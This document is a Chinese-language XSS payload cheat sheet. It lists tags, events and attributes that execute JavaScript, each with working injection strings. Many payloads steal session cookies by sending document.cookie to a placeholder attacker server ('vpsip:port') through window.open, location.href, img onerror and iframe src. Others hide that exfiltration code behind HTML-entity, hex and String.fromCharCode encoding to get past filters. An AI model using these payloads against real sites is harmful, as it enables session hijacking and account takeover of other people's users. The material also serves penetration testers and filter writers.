***XSS***

要想XSS必须要能够执行js代码

前排提示：如果是通过GET传参的话要对 + & #等进行编码，POST不需要，但是要注意下

属性或事件的名称不能被编码，但是属性或事件的值可以被html编码

能够执行js代码的标签

```
<script> <a> <p> <img> <body> <button> <var> <div> <iframe> <object> <input> <select> <textarea> <keygen> <frameset> <embed> <svg> <math> <video> <audio>
```



能够执行js代码的事件,在每个标签中以=来连接js代码，

例`<img src=x onerror=alert(1) />`

```
onload onunload onchange onsubmit onreset onselect onblur onfocus onabort onkeydown onkeypress onkeyup onclick ondbclick onmouseover onmousemove onmouseout onmouseup onforminput onformchange ondrag ondrop onerror
```

在这么多事件中，能够在图片或文件加载失败时候直接触发是`onerror`

能够在有焦点(就那个输入框的小光标)的情况下能直接触发的是`onfocus`（配合`autofocus `）

能够加载的标签比如`<svg>`和`<iframe>`能够直接触发的是`onload`

其他都是要一定交互的



能够执行js代码的属性，在每个标签中申明js语言再用:来连接js代码，

例`<a href=javascript:alert(1)>x</a>`

```
formaction action href xlink:href autofocus src content data
```



在标签中便签名和第一个属性间的`空格`可以用`/`来代替，最后一个属性的键值对和 `/>`直接的`空格`也可以用`/`代替，例如

```
<img src=x onerror=alert(1) />			//正常情况
<img/src=x onerror=alert(1) />			//代替前面的空格
<img src=x onerror=alert(1)//>			//代替后面的空格
<img/src=x onerror=alert(1)//>			//代替前后的空格
<img src=x/onerror=alert(1) />			//错误无法解析
```



------

`<script>`

专门为能执行js的标签用法

```
<script>alert(1)</script>
```

并且该标签可以加载远程的js代码

```
<script src="xx.js"></script>
```

当然打cookie不一定要加载远程的js代码(实质远程的js代码也是把cookie装入请求头并发送到服务器上)，只要把cookie的信息传到vps上即可

注GET请求的参数 + 要编码'%2b'，不然url请求头会把+当做空格

```
<script>window.open('http://vpsip:port/?cookie='+document.cookie)</script>
```

也可以使用如下方法

```
<script>window.location.href='http://vpsip:port/?cookie='+document.cookie</script>
```

其他的大部分标签都是通过包含事件或者属性来达到javascript代码执行的

------

`<a>`

该标签没法直接弹框，必须要用户交互

***利用属性href来实现xss***

```
<a href=javascript:alert(1) >xss</a>
```

对应发送cookie代码

```
<a href=javascript:window.open('http://vpsip:port/?cookie='+document.cookie) >xss</a>
```

或者

```
<a href=javascript:window.location.href='http://vpsip:port/?cookie='+document.cookie >xss</a>
```



***利用事件***

因为`<a>`不是加载文档或者图片的，所以onerror不行

常见的事件有onclick(点击触发),onmousemove(鼠标在组件上面移动触发)

```
<a onclick=alert(1) >xss</a>
```

```
<a onmousemove=alert(1) >xss</a>
```

发送cookie

```
<a onclick=window.open('http://vpsip:port/?cookie='+document.cookie) >xss</a>
```

或者

```
<a onclick=window.location.href='http://vpsip:port/?cookie='+document.cookie >xss</a>
```

------

`<img>`

该标签的作用本是加载图片，它是页面加载的时候会自动运行的，可以在一定情况下不需要交互就能触发

**利用属性src来实现xss**

下面payload高版本浏览器没法触发，IE7.0|IE6.0，才能执行

```
<img src="javascript:alert(1)" />
```

**利用事件**

因为`img`标签是会加载图片的，那么如果图片加载不成功就能使用onerror触发了

```
<img src=x onerror=alert(1) />
```

发送cookie的方式同理

```
<img src=x onerror=window.open('http://vpsip:port/?cookie='+document.cookie) />
<img src=x onerror=window.location.href='http://vpsip:port/?cookie='+document.cookie />
```

这里还有另外一种方式是通过`this.src`来重新加载

`this.src`是当前标签里面的`src`属性，给它重新赋值，可以做到请求远程的xss平台,但是因为会出现报错->重定义src->报错->重定义src，会往返循环，产生很多请求，因此要注意下

```
<img src=x onerror=this.src='http://vpsip:port/?cookie='+document.cookie) />
```

------

`<iframe>`

该标签的`src`属性相当于发起页面请求，因此可以直接跟远程服务器的ip,并且把cookie带过去

```
<iframe src='http://vpsip:port/?cookie'+document.cookie />
```

还可以是用事件，因为返回404也是能正常加载到当前页面，所有不能触发onerror

```
<iframe src=x onmousemove=alert(1) />
```

虽然不能触发onerror但是能触发onload

```
<iframe onload=alert(1) />
```

------

`<object>和<embed>`



这个2标签和`<a>`标签差不多，但是不需要交互，也就是能直接运行

利用data属性加载数据文档，当然也可用加载javascript

```
<object data=javascript:alert(1)></object>
<embed src=javascript:alert(1)></embed>
```

如果数据不存在，还可以利用onerror

```
<object data=x onerror=alert(1)></object>
```

甚至data属性还可以解析text/html,利用下base64编码，编码内容是`<script>alert(1)</script>`，如果直接写标签的`<>`会难以识别

```
<object data=data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==></object>
<embed src=data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==></object>
```

如果打cookie类比下`<img>`标签中的onerror或者`<a>`标签中的herf=javascript:即可

------

`<input>,<button>,<keygen>,<select>,<textarea>`

这几个标签一起讲师因为他们都有焦点这个东西，所有可以利用`onfocus`来达到无需交互直接触发xss

```
<input type=text onfocus=alert(1) autofocus />
```

```
<button onfocus=alert(1) autofocus />
```

```
<keygen onfocus=alert(1) autofocus />
```

```
<select onfocus=alert(1) autofocus />
```

```
<textarea onfocus=alert(1) autofocus />
```



------

`<svg>`

可缩放矢量图，可以理解利用该标签会加载组件,那么可以触发`onload`事件

```
<svg onload="javascript:alert(1)"></svg> 
```



------

`<marquee>`

该标签用来插入一段滚动的文字，实现类似走马灯的动效，所有可以写入后会出现触发`onstart`效果,但这个事件貌似只有少数的标签拥有

```
<marquee  onstart=alert(1)></marquee>
```

------

`<video>和<audio>`

一个加载视频，一个加载音频，因为是利用`src`加载，那么会出现加载错误导致的`onerror`事件

```
<video src=x onerror=alert(1) />
```

```
<audio src=x onerror=alert(1) />
```

------

自定义标签，自定义标签在有些时候也能触发,但是也是需要用户交互的

```
<b onclick="alert(1)">b
```



------

 **在有一定的过滤的前提下，能够通过href属性的bypass**

*利用html编码，编码javascript前缀*

```
<a href=javascrip&#116;:alert(1) >xss</a>
```

发送cookie

```
<a href=javascrip&#116;:window.location.href='http://vpsip:port/?cookie='+document.cookie >xss</a>
```

*利用js的编码，但是要使用eval来执行字符串,注意要编码内容加 "(双引号)或者 '(单引号)*

```
<a href=javascript:eval("\x61\x6c\x65\x72\x74\x28\x27\x31\x27\x29") >xss</a>
```

发送cookie,下面这个payload只是举例不要直接用，用的话请填自己的vpsip:port,再进行编码

```
<a href=javascript:eval("\x77\x69\x6e\x64\x6f\x77\x2e\x6c\x6f\x63\x61\x74\x69\x6f\x6e\x2e\x68\x72\x65\x66\x3d\x27\x68\x74\x74\x70\x3a\x2f\x2f\x76\x70\x73\x69\x70\x3a\x70\x6f\x72\x74\x2f\x3f\x63\x6f\x6f\x6b\x69\x65\x3d\x27\x2b\x64\x6f\x63\x75\x6d\x65\x6e\x74\x2e\x63\x6f\x6f\x6b\x69\x65")>xss</a>
```

*利用js的编码函数，但是要使用eval来执行字符串*

```
<a href=javascript:eval(String.fromCharCode(97,108,101,114,116,40,49,41)) >xss</a>
```

发送cookie,下面这个payload只是举例不要直接用，用的话请填自己的vpsip:port,再进行编码

```
<a href=javascript:eval(String.fromCharCode(119,105,110,100,111,119,46,108,111,99,97,116,105,111,110,46,104,114,101,102,61,39,104,116,116,112,58,47,47,118,112,115,105,112,58,112,111,114,116,47,63,99,111,111,107,105,101,61,39,43,100,111,99,117,109,101,110,116,46,99,111,111,107,105,101)) >xss</a>
```

*利用html编码，不需要使用eval来执行*

```
xss=<a href=javascript:&#97;&#108;&#101;&#114;&#116;&#40;&#49;&#41; >xss</a>
```

发送cookie,下面这个payload只是举例不要直接用，用的话请填自己的vpsip:port,再进行编码

```
<a href=javascript:&#32;&#119;&#105;&#110;&#100;&#111;&#119;&#46;&#108;&#111;&#99;&#97;&#116;&#105;&#111;&#110;&#46;&#104;&#114;&#101;&#102;&#61;&#39;&#104;&#116;&#116;&#112;&#58;&#47;&#47;&#118;&#112;&#115;&#105;&#112;&#58;&#112;&#111;&#114;&#116;&#47;&#63;&#99;&#111;&#111;&#107;&#105;&#101;&#61;&#39;&#43;&#100;&#111;&#99;&#117;&#109;&#101;&#110;&#116;&#46;&#99;&#111;&#111;&#107;&#105;&#101; >xss</a>
```



**在有一定的过滤前提下，事件的bypass**

事件和属性一样可以利用html编码

```
<img src=x onerror=&#97;&#108;&#101;&#114;&#116;&#40;&#49;&#41;>
```

发送cookie

```
<img src=x onerror=&#32;&#119;&#105;&#110;&#100;&#111;&#119;&#46;&#108;&#111;&#99;&#97;&#116;&#105;&#111;&#110;&#46;&#104;&#114;&#101;&#102;&#61;&#39;&#104;&#116;&#116;&#112;&#58;&#47;&#47;&#118;&#112;&#115;&#105;&#112;&#58;&#112;&#111;&#114;&#116;&#47;&#63;&#99;&#111;&#111;&#107;&#105;&#101;&#61;&#39;&#43;&#100;&#111;&#99;&#117;&#109;&#101;&#110;&#116;&#46;&#99;&#111;&#111;&#107;&#105;&#101;>
```

利用js的编码函数，和利用js编码可以类比



**一些小tips**

换行能够触发

```
<img src=x onerror%0a%0d=%0a%0dalert(1) />
```

闭合标签结尾多`空格`或`\`也能触发

```
<script        >alert(1)</script///>
```

javascript存在注释,如果是标签拼接的话可以注释掉多余的"，有些bypass是为了从"中逃逸出来的

```
\\ 和 \**\
```

javascript的标签和属性和事件名大小写不敏感

```
<imG sRc=x OnerroR=alert(1) />
```



------

参考文章：

<https://www.cnblogs.com/xiaozi/p/5588099.html>

<https://www.leavesongs.com/PENETRATION/xss-collect.html>
